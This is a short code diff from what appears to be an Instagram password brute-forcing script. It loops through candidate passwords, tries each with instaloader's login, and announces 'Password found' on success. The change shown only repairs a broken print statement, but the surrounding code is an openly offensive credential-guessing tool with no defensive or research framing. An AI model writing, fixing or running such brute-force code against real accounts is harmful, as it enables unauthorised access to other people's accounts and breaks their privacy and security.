@@ -72,7 +72,7 @@ for line in Lines:
         time.sleep(1)
         print("\n\033[94mTrying "+pstest+"..."+bcolors.PURPLE)
         L.login(USER , PASSWORD)
-        print(+bcolors.UNDERLINE+bcolors.BOLD+"\n\033[92m[✓]Password found:"+pstest)
+        print("\n\033[92m[✓]Password found:"+pstest)
         
         break
     except instaloader.exceptions.BadCredentialsException:
